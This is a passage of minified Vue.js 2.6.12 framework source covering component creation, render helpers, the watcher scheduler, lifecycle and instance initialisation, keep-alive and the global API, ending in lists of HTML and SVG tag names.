Array(o.length),r=0,i=o.length;r<i;r++)s=o[r],n[r]=t(e[s],s,r);return a(n)||(n=[]),n._isVList=!0,n}function Ht(e,t,n,r){var i,a=this.$scopedSlots[e];i=a?(n=n||{},r&&(l(r)||pe("slot v-bind without argument expects an Object",this),n=P(P({},r),n)),a(n)||t):this.$slots[e]||t;var o=n&&n.slot;return o?this.$createElement("template",{slot:o},i):i}function Vt(e){return We(this.$options,"filters",e,!0)||O}function Qt(e,t){return Array.isArray(e)?-1===e.indexOf(t):e!==t}function Gt(e,t,n,r,i){var a=z.keyCodes[t]||n;return i&&r&&!z.keyCodes[t]?Qt(i,r):a?Qt(a,e):r?B(r)!==t:void 0}function Wt(e,t,n,r,i){if(n)if(l(n)){var a;Array.isArray(n)&&(n=I(n));var o=function(o){if("class"===o||"style"===o||y(o))a=e;else{var s=e.attrs&&e.attrs.type;a=r||z.mustUseProp(t,s,o)?e.domProps||(e.domProps={}):e.attrs||(e.attrs={})}var l=S(o),c=B(o);l in a||c in a||(a[o]=n[o],i&&((e.on||(e.on={}))["update:"+o]=function(e){n[o]=e}))};for(var s in n)o(s)}else pe("v-bind without argument expects an Object or Array value",this);return e}function Kt(e,t){var n=this._staticTrees||(this._staticTrees=[]),r=n[e];return r&&!t||Xt(r=n[e]=this.$options.staticRenderFns[e].call(this._renderProxy,null,this),"__static__"+e,!1),r}function qt(e,t,n){return Xt(e,"__once__"+t+(n?"_"+n:""),!0),e}function Xt(e,t,n){if(Array.isArray(e))for(var r=0;r<e.length;r++)e[r]&&"string"!=typeof e[r]&&Yt(e[r],t+"_"+r,n);else Yt(e,t,n)}function Yt(e,t,n){e.isStatic=!0,e.key=t,e.isOnce=n}function Jt(e,t){if(t)if(d(t)){var n=e.on=e.on?P({},e.on):{};for(var r in t){var i=n[r],a=t[r];n[r]=i?[].concat(i,a):a}}else pe("v-on without argument expects an Object value",this);return e}function Zt(e,t,n,r){t=t||{$stable:!n};for(var i=0;i<e.length;i++){var a=e[i];Array.isArray(a)?Zt(a,t,n):a&&(a.proxy&&(a.fn.proxy=!0),t[a.key]=a.fn)}return r&&(t.$key=r),t}function en(e,t){for(var n=0;n<t.length;n+=2){var r=t[n];"string"==typeof r&&r?e[t[n]]=t[n+1]:""!==r&&null!==r&&pe("Invalid value for dynamic directive argument (expected string or null): "+r,this)}return e}function tn(e,t){return"string"==typeof e?t+e:e}function nn(e){e._o=qt,e._n=m,e._s=A,e._l=zt,e._t=Ht,e._q=N,e._i=D,e._m=Kt,e._f=Vt,e._k=Gt,e._b=Wt,e._v=ke,e._e=Se,e._u=Zt,e._g=Jt,e._d=en,e._p=tn}function rn(e,t,n,i,a){var s,l=this,c=a.options;w(i,"_uid")?(s=Object.create(i))._original=i:i=(s=i)._original;var u=o(c._compiled),d=!u;this.data=e,this.props=t,this.children=n,this.parent=i,this.listeners=e.on||r,this.injections=Nt(c.inject,i),this.slots=function(){return l.$slots||jt(e.scopedSlots,l.$slots=Dt(n,i)),l.$slots},Object.defineProperty(this,"scopedSlots",{enumerable:!0,get:function(){return jt(e.scopedSlots,this.slots())}}),u&&(this.$options=c,this.$slots=this.slots(),this.$scopedSlots=jt(e.scopedSlots,this.$slots)),c._scopeId?this._c=function(e,t,n,r){var a=dn(s,e,t,n,r,d);return a&&!Array.isArray(a)&&(a.fnScopeId=c._scopeId,a.fnContext=i),a}:this._c=function(e,t,n,r){return dn(s,e,t,n,r,d)}}function an(e,t,n,r,i){var a=Me(e);return a.fnContext=n,a.fnOptions=r,(a.devtoolsMeta=a.devtoolsMeta||{}).renderContext=i,t.slot&&((a.data||(a.data={})).slot=t.slot),a}function on(e,t){for(var n in t)e[S(n)]=t[n]}nn(rn.prototype);var sn={init:function(e,t){if(e.componentInstance&&!e.componentInstance._isDestroyed&&e.data.keepAlive){var n=e;sn.prepatch(n,n)}else(e.componentInstance=function(e,t){var n={_isComponent:!0,_parentVnode:e,parent:t},r=e.data.inlineTemplate;return a(r)&&(n.render=r.render,n.staticRenderFns=r.staticRenderFns),new e.componentOptions.Ctor(n)}(e,_n)).$mount(t?e.elm:void 0,t)},prepatch:function(e,t){var n=t.componentOptions;!function(e,t,n,i,a){wn=!0;var o=i.data.scopedSlots,s=e.$scopedSlots,l=!!(o&&!o.$stable||s!==r&&!s.$stable||o&&e.$scopedSlots.$key!==o.$key),c=!!(a||e.$options._renderChildren||l);if(e.$options._parentVnode=i,e.$vnode=i,e._vnode&&(e._vnode.parent=i),e.$options._renderChildren=a,e.$attrs=i.data.attrs||r,e.$listeners=n||r,t&&e.$options.props){Ie(!1);for(var u=e._props,d=e.$options._propKeys||[],p=0;p<d.length;p++){var h=d[p],f=e.$options.props;u[h]=Ke(h,f,t,e)}Ie(!0),e.$options.propsData=t}n=n||r;var A=e.$options._parentListeners;e.$options._parentListeners=n,bn(e,n,A),c&&(e.$slots=Dt(a,i.context),e.$forceUpdate()),wn=!1}(t.componentInstance=e.componentInstance,n.propsData,n.listeners,t,n.children)},insert:function(e){var t,n=e.context,r=e.componentInstance;r._isMounted||(r._isMounted=!0,kn(r,"mounted")),e.data.keepAlive&&(n._isMounted?((t=r)._inactive=!1,Bn.push(t)):Sn(r,!0))},destroy:function(e){var t=e.componentInstance;t._isDestroyed||(e.data.keepAlive?function e(t,n){if(!(n&&(t._directInactive=!0,xn(t))||t._inactive)){t._inactive=!0;for(var r=0;r<t.$children.length;r++)e(t.$children[r]);kn(t,"deactivated")}}(t,!0):t.$destroy())}},ln=Object.keys(sn);function cn(e,t,n,s,c){if(!i(e)){var u=n.$options._base;if(l(e)&&(e=u.extend(e)),"function"==typeof e){var d,p,h,A,m,v,g;if(i(e.cid)&&void 0===(e=function(e,t){if(o(e.error)&&a(e.errorComp))return e.errorComp;if(a(e.resolved))return e.resolved;var n=hn;if(n&&a(e.owners)&&-1===e.owners.indexOf(n)&&e.owners.push(n),o(e.loading)&&a(e.loadingComp))return e.loadingComp;if(n&&!a(e.owners)){var r=e.owners=[n],s=!0,c=null,u=null;n.$on("hook:destroyed",(function(){return b(r,n)}));var d=function(e){for(var t=0,n=r.length;t<n;t++)r[t].$forceUpdate();e&&(r.length=0,null!==c&&(clearTimeout(c),c=null),null!==u&&(clearTimeout(u),u=null))},p=R((function(n){e.resolved=fn(n,t),s?r.length=0:d(!0)})),h=R((function(t){pe("Failed to resolve async component: "+String(e)+(t?"\nReason: "+t:"")),a(e.errorComp)&&(e.error=!0,d(!0))})),A=e(p,h);return l(A)&&(f(A)?i(e.resolved)&&A.then(p,h):f(A.component)&&(A.component.then(p,h),a(A.error)&&(e.errorComp=fn(A.error,t)),a(A.loading)&&(e.loadingComp=fn(A.loading,t),0===A.delay?e.loading=!0:c=setTimeout((function(){c=null,i(e.resolved)&&i(e.error)&&(e.loading=!0,d(!1))}),A.delay||200)),a(A.timeout)&&(u=setTimeout((function(){u=null,i(e.resolved)&&h("timeout ("+A.timeout+"ms)")}),A.timeout)))),s=!1,e.loading?e.loadingComp:e.resolved}}(d=e,u)))return p=d,h=t,A=n,m=s,v=c,(g=Se()).asyncFactory=p,g.asyncMeta={data:h,context:A,children:m,tag:v},g;t=t||{},tr(e),a(t.model)&&function(e,t){var n=e.model&&e.model.prop||"value",r=e.model&&e.model.event||"input";(t.attrs||(t.attrs={}))[n]=t.model.value;var i=t.on||(t.on={}),o=i[r],s=t.model.callback;a(o)?(Array.isArray(o)?-1===o.indexOf(s):o!==s)&&(i[r]=[s].concat(o)):i[r]=s}(e.options,t);var y=function(e,t,n){var r=t.options.props;if(!i(r)){var o={},s=e.attrs,l=e.props;if(a(s)||a(l))for(var c in r){var u=B(c),d=c.toLowerCase();c!==d&&s&&w(s,d)&&he(fe(n||t)),Ft(o,l,c,u,!0)||Ft(o,s,c,u,!1)}return o}}(t,e,c);if(o(e.options.functional))return function(e,t,n,i,o){var s=e.options,l={},c=s.props;if(a(c))for(var u in c)l[u]=Ke(u,c,t||r);else a(n.attrs)&&on(l,n.attrs),a(n.props)&&on(l,n.props);var d=new rn(n,l,o,i,e),p=s.render.call(null,d._c,d);if(p instanceof Ce)return an(p,n,d.parent,s,d);if(Array.isArray(p)){for(var h=Lt(p)||[],f=new Array(h.length),A=0;A<h.length;A++)f[A]=an(h[A],n,d.parent,s,d);return f}}(e,y,t,n,s);var _=t.on;if(t.on=t.nativeOn,o(e.options.abstract)){var C=t.slot;t={},C&&(t.slot=C)}!function(e){for(var t=e.hook||(e.hook={}),n=0;n<ln.length;n++){var r=ln[n],i=t[r],a=sn[r];i===a||i&&i._merged||(t[r]=i?un(a,i):a)}}(t);var x=e.options.name||c;return new Ce("vue-component-"+e.cid+(x?"-"+x:""),t,void 0,void 0,void 0,n,{Ctor:e,propsData:y,listeners:_,tag:c,children:s},d)}pe("Invalid Component definition: "+String(e),n)}}function un(e,t){var n=function(n,r){e(n,r),t(n,r)};return n._merged=!0,n}function dn(e,t,n,r,c,u){return(Array.isArray(n)||s(n))&&(c=r,r=n,n=void 0),o(u)&&(c=2),function(e,t,n,r,c){if(a(n)&&a(n.__ob__))return pe("Avoid using observed data object as vnode data: "+JSON.stringify(n)+"\nAlways create fresh vnode data objects in each render!",e),Se();if(a(n)&&a(n.is)&&(t=n.is),!t)return Se();var u,d,p;(a(n)&&a(n.key)&&!s(n.key)&&pe("Avoid using non-primitive value as key, use string/number value instead.",e),Array.isArray(r)&&"function"==typeof r[0]&&((n=n||{}).scopedSlots={default:r[0]},r.length=0),2===c?r=Lt(r):1===c&&(r=function(e){for(var t=0;t<e.length;t++)if(Array.isArray(e[t]))return Array.prototype.concat.apply([],e);return e}(r)),"string"==typeof t)?(d=e.$vnode&&e.$vnode.ns||z.getTagNamespace(t),u=z.isReservedTag(t)?(a(n)&&a(n.nativeOn)&&pe("The .native modifier for v-on is only valid on components but it was used on <"+t+">.",e),new Ce(z.parsePlatformTagName(t),n,r,void 0,void 0,e)):n&&n.pre||!a(p=We(e.$options,"components",t))?new Ce(t,n,r,void 0,void 0,e):cn(p,n,e,r,t)):u=cn(t,n,e,r);return Array.isArray(u)?u:a(u)?(a(d)&&function e(t,n,r){if(t.ns=n,"foreignObject"===t.tag&&(r=!(n=void 0)),a(t.children))for(var s=0,l=t.children.length;s<l;s++){var c=t.children[s];a(c.tag)&&(i(c.ns)||o(r)&&"svg"!==c.tag)&&e(c,n,r)}}(u,d),a(n)&&function(e){l(e.style)&&Bt(e.style),l(e.class)&&Bt(e.class)}(n),u):Se()}(e,t,n,r,c)}var pn,hn=null;function fn(e,t){return(e.__esModule||de&&"Module"===e[Symbol.toStringTag])&&(e=e.default),l(e)?t.extend(e):e}function An(e){return e.isComment&&e.asyncFactory}function mn(e){if(Array.isArray(e))for(var t=0;t<e.length;t++){var n=e[t];if(a(n)&&(a(n.componentOptions)||An(n)))return n}}function vn(e,t){pn.$on(e,t)}function gn(e,t){pn.$off(e,t)}function yn(e,t){var n=pn;return function r(){null!==t.apply(null,arguments)&&n.$off(e,r)}}function bn(e,t,n){Pt(t,n||{},vn,gn,yn,pn=e),pn=void 0}var _n=null,wn=!1;function Cn(e){var t=_n;return _n=e,function(){_n=t}}function xn(e){for(;e&&(e=e.$parent);)if(e._inactive)return!0;return!1}function Sn(e,t){if(t){if(e._directInactive=!1,xn(e))return}else if(e._directInactive)return;if(e._inactive||null===e._inactive){e._inactive=!1;for(var n=0;n<e.$children.length;n++)Sn(e.$children[n]);kn(e,"activated")}}function kn(e,t){_e();var n=e.$options[t],r=t+" hook";if(n)for(var i=0,a=n.length;i<a;i++)rt(n[i],e,null,e,r);e._hasHookEvent&&e.$emit("hook:"+t),we()}var Mn=[],Bn=[],En={},Tn={},Pn=!1,In=!1,Fn=0,Ln=0,On=Date.now;if(q&&!Z){var Nn=window.performance;Nn&&"function"==typeof Nn.now&&On()>document.createEvent("Event").timeStamp&&(On=function(){return Nn.now()})}function Dn(){var e,t;for(Ln=On(),In=!0,Mn.sort((function(e,t){return e.id-t.id})),Fn=0;Fn<Mn.length;Fn++)if((e=Mn[Fn]).before&&e.before(),t=e.id,En[t]=null,e.run(),null!=En[t]&&(Tn[t]=(Tn[t]||0)+1,Tn[t]>100)){pe("You may have an infinite update loop "+(e.user?'in watcher with expression "'+e.expression+'"':"in a component render function."),e.vm);break}var n=Bn.slice(),r=Mn.slice();Fn=Mn.length=Bn.length=0,En={},Pn=In=!(Tn={}),function(e){for(var t=0;t<e.length;t++)e[t]._inactive=!0,Sn(e[t],!0)}(n),function(e){for(var t=e.length;t--;){var n=e[t],r=n.vm;r._watcher===n&&r._isMounted&&!r._isDestroyed&&kn(r,"updated")}}(r),le&&z.devtools&&le.emit("flush")}var Rn=0,jn=function(e,t,n,r,i){this.vm=e,i&&(e._watcher=this),e._watchers.push(this),r?(this.deep=!!r.deep,this.user=!!r.user,this.lazy=!!r.lazy,this.sync=!!r.sync,this.before=r.before):this.deep=this.user=this.lazy=this.sync=!1,this.cb=n,this.id=++Rn,this.active=!0,this.dirty=this.lazy,this.deps=[],this.newDeps=[],this.depIds=new ue,this.newDepIds=new ue,this.expression=t.toString(),"function"==typeof t?this.getter=t:(this.getter=function(e){if(!W.test(e)){var t=e.split(".");return function(e){for(var n=0;n<t.length;n++){if(!e)return;e=e[t[n]]}return e}}}(t),this.getter||(this.getter=F,pe('Failed watching path: "'+t+'" Watcher only accepts simple dot-delimited paths. For full control, use a function instead.',e))),this.value=this.lazy?void 0:this.get()};jn.prototype.get=function(){var e;_e(this);var t=this.vm;try{e=this.getter.call(t,t)}catch(e){if(!this.user)throw e;nt(e,t,'getter for watcher "'+this.expression+'"')}finally{this.deep&&Bt(e),we(),this.cleanupDeps()}return e},jn.prototype.addDep=function(e){var t=e.id;this.newDepIds.has(t)||(this.newDepIds.add(t),this.newDeps.push(e),this.depIds.has(t)||e.addSub(this))},jn.prototype.cleanupDeps=function(){for(var e=this.deps.length;e--;){var t=this.deps[e];this.newDepIds.has(t.id)||t.removeSub(this)}var n=this.depIds;this.depIds=this.newDepIds,this.newDepIds=n,this.newDepIds.clear(),n=this.deps,this.deps=this.newDeps,this.newDeps=n,this.newDeps.length=0},jn.prototype.update=function(){this.lazy?this.dirty=!0:this.sync?this.run():function(e){var t=e.id;if(null==En[t]){if(En[t]=!0,In){for(var n=Mn.length-1;Fn<n&&Mn[n].id>e.id;)n--;Mn.splice(n+1,0,e)}else Mn.push(e);if(!Pn){if(Pn=!0,!z.async)return Dn();vt(Dn)}}}(this)},jn.prototype.run=function(){if(this.active){var e=this.get();if(e!==this.value||l(e)||this.deep){var t=this.value;if(this.value=e,this.user)try{this.cb.call(this.vm,e,t)}catch(e){nt(e,this.vm,'callback for watcher "'+this.expression+'"')}else this.cb.call(this.vm,e,t)}}},jn.prototype.evaluate=function(){this.value=this.get(),this.dirty=!1},jn.prototype.depend=function(){for(var e=this.deps.length;e--;)this.deps[e].depend()},jn.prototype.teardown=function(){if(this.active){this.vm._isBeingDestroyed||b(this.vm._watchers,this);for(var e=this.deps.length;e--;)this.deps[e].removeSub(this);this.active=!1}};var Un={enumerable:!0,configurable:!0,get:F,set:F};function $n(e,t,n){Un.get=function(){return this[t][n]},Un.set=function(e){this[t][n]=e},Object.defineProperty(e,n,Un)}var zn={lazy:!0};function Hn(e,t,n){var r=!se();Un.set="function"==typeof n?(Un.get=r?Vn(t):Qn(n),F):(Un.get=n.get?r&&!1!==n.cache?Vn(t):Qn(n.get):F,n.set||F),Un.set===F&&(Un.set=function(){pe('Computed property "'+t+'" was assigned to but it has no setter.',this)}),Object.defineProperty(e,t,Un)}function Vn(e){return function(){var t=this._computedWatchers&&this._computedWatchers[e];if(t)return t.dirty&&t.evaluate(),ye.target&&t.depend(),t.value}}function Qn(e){return function(){return e.call(this,this)}}function Gn(e,t,n,r){return d(n)&&(n=(r=n).handler),"string"==typeof n&&(n=e[n]),e.$watch(t,n,r)}var Wn,Kn,qn,Xn,Yn,Jn,Zn,er=0;function tr(e){var t=e.options;if(e.super){var n=tr(e.super);if(n!==e.superOptions){e.superOptions=n;var r=function(e){var t,n=e.options,r=e.sealedOptions;for(var i in n)n[i]!==r[i]&&(t||(t={}),t[i]=n[i]);return t}(e);r&&P(e.extendOptions,r),(t=e.options=Ge(n,e.extendOptions)).name&&(t.components[t.name]=e)}}return t}function nr(e){this instanceof nr||pe("Vue is a constructor and should be called with the `new` keyword"),this._init(e)}function rr(e){return e&&(e.Ctor.options.name||e.tag)}function ir(e,t){return Array.isArray(e)?-1<e.indexOf(t):"string"==typeof e?-1<e.split(",").indexOf(t):!!p(e)&&e.test(t)}function ar(e,t){var n=e.cache,r=e.keys,i=e._vnode;for(var a in n){var o=n[a];if(o){var s=rr(o.componentOptions);s&&!t(s)&&or(n,a,r,i)}}}function or(e,t,n,r){var i=e[t];!i||r&&i.tag===r.tag||i.componentInstance.$destroy(),e[t]=null,b(n,t)}nr.prototype._init=function(e){var t,n,i,a,o,s,l=this;l._uid=er++,z.performance&&st&&(t="vue-perf-start:"+l._uid,n="vue-perf-end:"+l._uid,st(t)),l._isVue=!0,e&&e._isComponent?function(e,t){var n=e.$options=Object.create(e.constructor.options),r=t._parentVnode;n.parent=t.parent;var i=(n._parentVnode=r).componentOptions;n.propsData=i.propsData,n._parentListeners=i.listeners,n._renderChildren=i.children,n._componentTag=i.tag,t.render&&(n.render=t.render,n.staticRenderFns=t.staticRenderFns)}(l,e):l.$options=Ge(tr(l.constructor),e||{},l),gt(l),function(e){var t=e.$options,n=t.parent;if(n&&!t.abstract){for(;n.$options.abstract&&n.$parent;)n=n.$parent;n.$children.push(e)}e.$parent=n,e.$root=n?n.$root:e,e.$children=[],e.$refs={},e._watcher=null,e._inactive=null,e._directInactive=!1,e._isMounted=!1,e._isDestroyed=!1,e._isBeingDestroyed=!1}(l._self=l),function(e){e._events=Object.create(null),e._hasHookEvent=!1;var t=e.$options._parentListeners;t&&bn(e,t)}(l),function(e){e._vnode=null,e._staticTrees=null;var t=e.$options,n=e.$vnode=t._parentVnode,i=n&&n.context;e.$slots=Dt(t._renderChildren,i),e.$scopedSlots=r,e._c=function(t,n,r,i){return dn(e,t,n,r,i,!1)},e.$createElement=function(t,n,r,i){return dn(e,t,n,r,i,!0)};var a=n&&n.data;Oe(e,"$attrs",a&&a.attrs||r,(function(){!wn&&pe("$attrs is readonly.",e)}),!0),Oe(e,"$listeners",t._parentListeners||r,(function(){!wn&&pe("$listeners is readonly.",e)}),!0)}(l),kn(l,"beforeCreate"),(a=Nt((i=l).$options.inject,i))&&(Ie(!1),Object.keys(a).forEach((function(e){Oe(i,e,a[e],(function(){pe('Avoid mutating an injected value directly since the changes will be overwritten whenever the provided component re-renders. injection being mutated: "'+e+'"',i)}))})),Ie(!0)),function(e){e._watchers=[];var t=e.$options;t.props&&function(e,t){var n=e.$options.propsData||{},r=e._props={},i=e.$options._propKeys=[],a=!e.$parent;a||Ie(!1);var o=function(o){i.push(o);var s=Ke(o,t,n,e),l=B(o);(y(l)||z.isReservedAttr(l))&&pe('"'+l+'" is a reserved attribute and cannot be used as component prop.',e),Oe(r,o,s,(function(){a||wn||pe("Avoid mutating a prop directly since the value will be overwritten whenever the parent component re-renders. Instead, use a data or computed property based on the prop's value. Prop being mutated: \""+o+'"',e)})),o in e||$n(e,"_props",o)};for(var s in t)o(s);Ie(!0)}(e,t.props),t.methods&&function(e,t){var n=e.$options.props;for(var r in t)"function"!=typeof t[r]&&pe('Method "'+r+'" has type "'+_typeof2(t[r])+'" in the component definition. Did you reference the function correctly?',e),n&&w(n,r)&&pe('Method "'+r+'" has already been defined as a prop.',e),r in e&&V(r)&&pe('Method "'+r+'" conflicts with an existing Vue instance method. Avoid defining component methods that start with _ or $.'),e[r]="function"!=typeof t[r]?F:E(t[r],e)}(e,t.methods),t.data?function(e){var t=e.$options.data;d(t=e._data="function"==typeof t?function(e,t){_e();try{return e.call(t,t)}catch(e){return nt(e,t,"data()"),{}}finally{we()}}(t,e):t||{})||(t={},pe("data functions should return an object:\nhttps://vuejs.org/v2/guide/components.html#data-Must-Be-a-Function",e));for(var n=Object.keys(t),r=e.$options.props,i=e.$options.methods,a=n.length;a--;){var o=n[a];i&&w(i,o)&&pe('Method "'+o+'" has already been defined as a data property.',e),r&&w(r,o)?pe('The data property "'+o+'" is already declared as a prop. Use prop default value instead.',e):V(o)||$n(e,"_data",o)}Le(t,!0)}(e):Le(e._data={},!0),t.computed&&function(e,t){var n=e._computedWatchers=Object.create(null),r=se();for(var i in t){var a=t[i],o="function"==typeof a?a:a.get;null==o&&pe('Getter is missing for computed property "'+i+'".',e),r||(n[i]=new jn(e,o||F,F,zn)),i in e?i in e.$data?pe('The computed property "'+i+'" is already defined in data.',e):e.$options.props&&i in e.$options.props&&pe('The computed property "'+i+'" is already defined as a prop.',e):Hn(e,i,a)}}(e,t.computed),t.watch&&t.watch!==ie&&function(e,t){for(var n in t){var r=t[n];if(Array.isArray(r))for(var i=0;i<r.length;i++)Gn(e,n,r[i]);else Gn(e,n,r)}}(e,t.watch)}(l),(s=(o=l).$options.provide)&&(o._provided="function"==typeof s?s.call(o):s),kn(l,"created"),z.performance&&st&&(l._name=fe(l,!1),st(n),lt("vue "+l._name+" init",t,n)),l.$options.el&&l.$mount(l.$options.el)},Wn=nr,qn={get:function(){return this._props}},(Kn={get:function(){return this._data}}).set=function(){pe("Avoid replacing instance root $data. Use nested data properties instead.",this)},qn.set=function(){pe("$props is readonly.",this)},Object.defineProperty(Wn.prototype,"$data",Kn),Object.defineProperty(Wn.prototype,"$props",qn),Wn.prototype.$set=Ne,Wn.prototype.$delete=De,Wn.prototype.$watch=function(e,t,n){var r=this;if(d(t))return Gn(r,e,t,n);(n=n||{}).user=!0;var i=new jn(r,e,t,n);if(n.immediate)try{t.call(r,i.value)}catch(e){nt(e,r,'callback for immediate watcher "'+i.expression+'"')}return function(){i.teardown()}},Yn=/^hook:/,(Xn=nr).prototype.$on=function(e,t){if(Array.isArray(e))for(var n=0,r=e.length;n<r;n++)this.$on(e[n],t);else(this._events[e]||(this._events[e]=[])).push(t),Yn.test(e)&&(this._hasHookEvent=!0);return this},Xn.prototype.$once=function(e,t){var n=this;function r(){n.$off(e,r),t.apply(n,arguments)}return r.fn=t,n.$on(e,r),n},Xn.prototype.$off=function(e,t){if(!arguments.length)return this._events=Object.create(null),this;if(Array.isArray(e)){for(var n=0,r=e.length;n<r;n++)this.$off(e[n],t);return this}var i,a=this._events[e];if(!a)return this;if(!t)return this._events[e]=null,this;for(var o=a.length;o--;)if((i=a[o])===t||i.fn===t){a.splice(o,1);break}return this},Xn.prototype.$emit=function(e){var t=e.toLowerCase();t!==e&&this._events[t]&&he((fe(this),B(e)));var n=this._events[e];if(n){n=1<n.length?T(n):n;for(var r=T(arguments,1),i='event handler for "'+e+'"',a=0,o=n.length;a<o;a++)rt(n[a],this,r,this,i)}return this},(Jn=nr).prototype._update=function(e,t){var n=this,r=n.$el,i=n._vnode,a=Cn(n);n._vnode=e,n.$el=i?n.__patch__(i,e):n.__patch__(n.$el,e,t,!1),a(),r&&(r.__vue__=null),n.$el&&(n.$el.__vue__=n),n.$vnode&&n.$parent&&n.$vnode===n.$parent._vnode&&(n.$parent.$el=n.$el)},Jn.prototype.$forceUpdate=function(){this._watcher&&this._watcher.update()},Jn.prototype.$destroy=function(){var e=this;if(!e._isBeingDestroyed){kn(e,"beforeDestroy"),e._isBeingDestroyed=!0;var t=e.$parent;!t||t._isBeingDestroyed||e.$options.abstract||b(t.$children,e),e._watcher&&e._watcher.teardown();for(var n=e._watchers.length;n--;)e._watchers[n].teardown();e._data.__ob__&&e._data.__ob__.vmCount--,e._isDestroyed=!0,e.__patch__(e._vnode,null),kn(e,"destroyed"),e.$off(),e.$el&&(e.$el.__vue__=null),e.$vnode&&(e.$vnode.parent=null)}},nn((Zn=nr).prototype),Zn.prototype.$nextTick=function(e){return vt(e,this)},Zn.prototype._render=function(){var e,t=this,n=t.$options,r=n.render,i=n._parentVnode;i&&(t.$scopedSlots=jt(i.data.scopedSlots,t.$slots,t.$scopedSlots)),t.$vnode=i;try{hn=t,e=r.call(t._renderProxy,t.$createElement)}catch(n){if(nt(n,t,"render"),t.$options.renderError)try{e=t.$options.renderError.call(t._renderProxy,t.$createElement,n)}catch(n){nt(n,t,"renderError"),e=t._vnode}else e=t._vnode}finally{hn=null}return Array.isArray(e)&&1===e.length&&(e=e[0]),e instanceof Ce||(Array.isArray(e)&&pe("Multiple root nodes returned from render function. Render function should return a single root node.",t),e=Se()),e.parent=i,e};var sr,lr,cr,ur=[String,RegExp,Array],dr={KeepAlive:{name:"keep-alive",abstract:!0,props:{include:ur,exclude:ur,max:[String,Number]},created:function(){this.cache=Object.create(null),this.keys=[]},destroyed:function(){for(var e in this.cache)or(this.cache,e,this.keys)},mounted:function(){var e=this;this.$watch("include",(function(t){ar(e,(function(e){return ir(t,e)}))})),this.$watch("exclude",(function(t){ar(e,(function(e){return!ir(t,e)}))}))},render:function(){var e=this.$slots.default,t=mn(e),n=t&&t.componentOptions;if(n){var r=rr(n),i=this.include,a=this.exclude;if(i&&(!r||!ir(i,r))||a&&r&&ir(a,r))return t;var o=this.cache,s=this.keys,l=null==t.key?n.Ctor.cid+(n.tag?"::"+n.tag:""):t.key;o[l]?(t.componentInstance=o[l].componentInstance,b(s,l),s.push(l)):(o[l]=t,s.push(l),this.max&&s.length>parseInt(this.max)&&or(o,s[0],s,this._vnode)),t.data.keepAlive=!0}return t||e&&e[0]}}};sr=nr,cr={get:function(){return z},set:function(){pe("Do not replace the Vue.config object, set individual fields instead.")}},Object.defineProperty(sr,"config",cr),sr.util={warn:pe,extend:P,mergeOptions:Ge,defineReactive:Oe},sr.set=Ne,sr.delete=De,sr.nextTick=vt,sr.observable=function(e){return Le(e),e},sr.options=Object.create(null),U.forEach((function(e){sr.options[e+"s"]=Object.create(null)})),P((sr.options._base=sr).options.components,dr),sr.use=function(e){var t=this._installedPlugins||(this._installedPlugins=[]);if(-1<t.indexOf(e))return this;var n=T(arguments,1);return n.unshift(this),"function"==typeof e.install?e.install.apply(e,n):"function"==typeof e&&e.apply(null,n),t.push(e),this},sr.mixin=function(e){return this.options=Ge(this.options,e),this},function(e){e.cid=0;var t=1;e.extend=function(e){e=e||{};var n=this,r=n.cid,i=e._Ctor||(e._Ctor={});if(i[r])return i[r];var a=e.name||n.options.name;a&&Ve(a);var o=function(e){this._init(e)};return((o.prototype=Object.create(n.prototype)).constructor=o).cid=t++,o.options=Ge(n.options,e),o.super=n,o.options.props&&function(e){var t=e.options.props;for(var n in t)$n(e.prototype,"_props",n)}(o),o.options.computed&&function(e){var t=e.options.computed;for(var n in t)Hn(e.prototype,n,t[n])}(o),o.extend=n.extend,o.mixin=n.mixin,o.use=n.use,U.forEach((function(e){o[e]=n[e]})),a&&(o.options.components[a]=o),o.superOptions=n.options,o.extendOptions=e,o.sealedOptions=P({},o.options),i[r]=o}}(sr),lr=sr,U.forEach((function(e){lr[e]=function(t,n){return n?("component"===e&&Ve(t),"component"===e&&d(n)&&(n.name=n.name||t,n=this.options._base.extend(n)),"directive"===e&&"function"==typeof n&&(n={bind:n,update:n}),this.options[e+"s"][t]=n):this.options[e+"s"][t]}})),Object.defineProperty(nr.prototype,"$isServer",{get:se}),Object.defineProperty(nr.prototype,"$ssrContext",{get:function(){return this.$vnode&&this.$vnode.ssrContext}}),Object.defineProperty(nr,"FunctionalRenderContext",{value:rn}),nr.version="2.6.12";var pr=v("style,class"),hr=v("input,textarea,option,select,progress"),fr=function(e,t,n){return"value"===n&&hr(e)&&"button"!==t||"selected"===n&&"option"===e||"checked"===n&&"input"===e||"muted"===n&&"video"===e},Ar=v("contenteditable,draggable,spellcheck"),mr=v("events,caret,typing,plaintext-only"),vr=v("allowfullscreen,async,autofocus,autoplay,checked,compact,controls,declare,default,defaultchecked,defaultmuted,defaultselected,defer,disabled,enabled,formnovalidate,hidden,indeterminate,inert,ismap,itemscope,loop,multiple,muted,nohref,noresize,noshade,novalidate,nowrap,open,pauseonexit,readonly,required,reversed,scoped,seamless,selected,sortable,translate,truespeed,typemustmatch,visible"),gr="http://www.w3.org/1999/xlink",yr=function(e){return":"===e.charAt(5)&&"xlink"===e.slice(0,5)},br=function(e){return yr(e)?e.slice(6,e.length):""},_r=function(e){return null==e||!1===e};function wr(e,t){return{staticClass:Cr(e.staticClass,t.staticClass),class:a(e.class)?[e.class,t.class]:t.class}}function Cr(e,t){return e?t?e+" "+t:e:t||""}function xr(e){return Array.isArray(e)?function(e){for(var t,n="",r=0,i=e.length;r<i;r++)a(t=xr(e[r]))&&""!==t&&(n&&(n+=" "),n+=t);return n}(e):l(e)?function(e){var t="";for(var n in e)e[n]&&(t&&(t+=" "),t+=n);return t}(e):"string"==typeof e?e:""}var Sr={svg:"http://www.w3.org/2000/svg",math:"http://www.w3.org/1998/Math/MathML"},kr=v("html,body,base,head,link,meta,style,title,address,article,aside,footer,header,h1,h2,h3,h4,h5,h6,hgroup,nav,section,div,dd,dl,dt,figcaption,figure,picture,hr,img,li,main,ol,p,pre,ul,a,b,abbr,bdi,bdo,br,cite,code,data,dfn,em,i,kbd,mark,q,rp,rt,rtc,ruby,s,samp,small,span,strong,sub,sup,time,u,var,wbr,area,audio,map,track,video,embed,object,param,source,canvas,script,noscript,del,ins,caption,col,colgroup,table,thead,tbody,td,th,tr,button,datalist,fieldset,form,input,label,legend,meter,optgroup,option,output,progress,select,textarea,details,dialog,menu,menuitem,summary,content,element,shadow,template,blockquote,iframe,tfoot"),Mr=v("svg,animate,circle,clippath,cursor,defs,desc,ellipse,filter,font-face,foreignObject,g,glyph,image,line,marker,mask,missing-glyph,path,pattern,polygon,polyline,rect,switch,symbol,text,textpath,tspan,use,view"